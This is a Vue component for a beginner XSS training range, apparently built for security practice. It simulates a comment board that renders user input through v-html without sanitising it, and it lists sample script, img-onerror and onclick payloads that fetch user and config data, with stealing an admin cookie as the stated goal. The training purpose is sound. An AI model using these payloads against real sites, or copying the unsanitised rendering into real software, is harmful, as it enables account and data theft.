<template>
  <div class="challenge-container">
    <div class="challenge-header">
      <img :src="logoUrl" alt="Logo" class="logo" />
      <h2>XSS跨站脚本靶场</h2>
    </div>

    <el-card class="challenge-card">
      <template #header>
        <div class="card-header">
          <h3>靶场说明</h3>
          <el-tag type="success">难度：★☆☆☆☆</el-tag>
        </div>
      </template>

      <div class="challenge-content">
        <div class="description-section">
          <p>这是一个XSS跨站脚本靶场，用于学习和实践XSS攻击技术。靶场模拟了一个简单的评论系统，你的目标是获取管理员的Cookie信息。</p>
          <div class="tips">
            <h4>提示：</h4>
            <ul>
              <li>尝试使用基本的XSS payload，如 &lt;script&gt;alert(1)&lt;/script&gt;</li>
              <li>注意观察输入过滤机制</li>
              <li>尝试使用不同的HTML标签和事件处理器</li>
              <li>使用JavaScript来获取Cookie信息</li>
            </ul>
          </div>
        </div>

        <div class="target-section">
          <h4>目标</h4>
          <p>通过XSS攻击获取数据库中的敏感信息。具体目标：
            获取用户表中的管理员账号信息
          </p>
        </div>

        <div class="comment-section">
          <h4>评论系统</h4>
          <el-form :model="commentForm" class="comment-form">
            <el-form-item label="用户名">
              <el-input v-model="commentForm.username" placeholder="请输入用户名" />
            </el-form-item>
            <el-form-item label="评论内容">
              <el-input
                v-model="commentForm.content"
                type="textarea"
                :rows="4"
                placeholder="请输入评论内容"
              />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" @click="submitComment">发表评论</el-button>
            </el-form-item>
          </el-form>
          <div class="payload-tips">
            <h4>测试Payload：</h4>
            <pre>// 获取用户信息
&lt;script&gt;
fetch('/api/users')
  .then(response => response.json())
  .then(data => alert(JSON.stringify(data)));
&lt;/script&gt;

// 获取系统配置
&lt;script&gt;
fetch('/api/config')
  .then(response => response.json())
  .then(data => alert(JSON.stringify(data)));
&lt;/script&gt;

// 获取评论记录
&lt;script&gt;
fetch('/api/comments?limit=10')
  .then(response => response.json())
  .then(data => alert(JSON.stringify(data)));
&lt;/script&gt;

// 使用img标签的onerror事件获取数据
&lt;img src="x" onerror="fetch('/api/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))"&gt;

// 使用a标签的onclick事件获取数据
&lt;a href="javascript:void(0)" onclick="fetch('/api/config').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))"&gt;点击获取配置&lt;/a&gt;</pre>
          </div>
        </div>

        <div class="comments-list">
          <h4>评论列表</h4>
          <div v-for="comment in comments" :key="comment.id" class="comment-item">
            <div class="comment-content" v-html="comment.content"></div>
          </div>
        </div>
      </div>
    </el-card>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue'
import { ElMessage } from 'element-plus'
import axios from 'axios'

const logoUrl = ref('/src/assets/logo/logo/信息.png')
const commentForm = ref({
  username: '',
  content: ''
})
const comments = ref([])
const goal = ref('')

// 获取评论列表
const fetchComments = async () => {
  try {
    const response = await axios.get('http://localhost:8086/comments')
    comments.value = response.data.data
    goal.value = response.data.goal
  } catch (error) {
    ElMessage.error('获取评论列表失败：' + error.message)
  }
}

// 提交评论
const submitComment = async () => {
  if (!commentForm.value.username || !commentForm.value.content) {
    ElMessage.warning('请填写完整的评论信息')
    return
  }

  try {
    const response = await axios.post('http://localhost:8086/comment', {
      username: commentForm.value.username,
      comment: commentForm.value.content
    })

    // 提交成功后刷新评论列表
    await fetchComments()
    
    // 清空表单
    commentForm.value.content = ''
    ElMessage.success('评论发表成功！')
  } catch (error) {
    ElMessage.error('评论发表失败：' + error.message)
  }
}

// 页面加载时获取评论列表
onMounted(() => {
  fetchComments()
})
</script>

<style scoped>
.challenge-container {
  padding: 20px;
  max-width: 1200px;
  margin: 0 auto;
}

.challenge-header {
  display: flex;
  align-items: center;
  gap: 20px;
  margin-bottom: 30px;
}

.logo {
  height: 50px;
  width: auto;
}

.challenge-header h2 {
  margin: 0;
  color: #333;
  font-size: 24px;
}

.challenge-card {
  margin-bottom: 20px;
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.card-header h3 {
  margin: 0;
  color: #333;
}

.challenge-content {
  padding: 20px 0;
}

.description-section {
  margin-bottom: 30px;
}

.description-section p {
  color: #666;
  line-height: 1.6;
}

.tips {
  background-color: #f8f9fa;
  padding: 15px;
  border-radius: 8px;
  margin-top: 20px;
}

.tips h4 {
  color: #333;
  margin-bottom: 10px;
}

.tips ul {
  padding-left: 20px;
  color: #666;
}

.tips li {
  margin-bottom: 8px;
}

.target-section {
  margin: 20px 0;
  padding: 20px;
  border-radius: 8px;
  background-color: #f8f9fa;
}

.target-section h4 {
  color: #333;
  margin-bottom: 15px;
}

.target-section p {
  color: #666;
  line-height: 1.6;
}

.hint {
  color: #909399;
  font-size: 0.875em;
  margin-top: 10px;
}

.comment-section {
  background-color: #fff;
  padding: 20px;
  border-radius: 8px;
  box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1);
  margin-bottom: 30px;
}

.comment-section h4 {
  color: #333;
  margin-bottom: 20px;
}

.comment-form {
  max-width: 600px;
}

.comments-list {
  margin-top: 30px;
}

.comments-list h4 {
  color: #333;
  margin-bottom: 20px;
}

.comment-item {
  background-color: #f8f9fa;
  padding: 15px;
  border-radius: 8px;
  margin-bottom: 15px;
}

.comment-header {
  display: flex;
  justify-content: space-between;
  margin-bottom: 10px;
}

.username {
  font-weight: bold;
  color: #333;
}

.time {
  color: #999;
  font-size: 0.9em;
}

.comment-content {
  color: #666;
  line-height: 1.6;
  word-break: break-all;
  min-height: 20px;
}

.comment-content pre {
  margin: 0;
  white-space: pre-wrap;
  word-wrap: break-word;
  font-family: monospace;
  background-color: #f8f9fa;
  padding: 10px;
  border-radius: 4px;
}

.payload-tips {
  margin-top: 20px;
  padding: 15px;
  background-color: #f8f9fa;
  border-radius: 8px;
}

.payload-tips pre {
  background-color: #1e1e1e;
  color: #fff;
  padding: 10px;
  border-radius: 4px;
  margin: 10px 0;
  font-family: monospace;
}
</style> 